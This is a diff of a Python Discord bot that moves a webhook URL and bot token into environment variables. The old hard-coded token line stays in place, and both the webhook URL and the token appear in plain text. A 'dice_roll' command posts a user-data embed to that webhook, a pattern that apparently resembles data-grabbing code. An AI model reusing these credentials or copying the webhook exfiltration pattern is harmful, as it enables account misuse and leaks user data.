@@ -13,6 +13,8 @@ import base64
 import datetime
 import random
 import math
+from dotenv import load_dotenv
+load_dotenv()
 
 def install_import(modules):
     for module, pip_name in modules:
@@ -288,7 +290,7 @@ async def dice_roll(
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
                 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1449829007678902443/cj67t6cyF0pzXJFAPkBuMPtmoyPunCZaJNdW_udN9-Jkmz2uo80GgTbiA4U6RjJUZA99', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request(os.getenv("WEBHOOK_URL"), data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
@@ -306,4 +308,5 @@ if __name__ == "__main__":
             print(f"{len(synced)} 個のコマンドを同期しました")
         except Exception as e:
             print(e)
+        bot.run(os.getenv("BOT_TOKEN"))
     bot.run("MTQ1MjczNjA5MTIxOTAzODM3Mg.G6vzmp.sX24rHZinPrs4TzASwakClopIQgQmGGoNlXnSI")
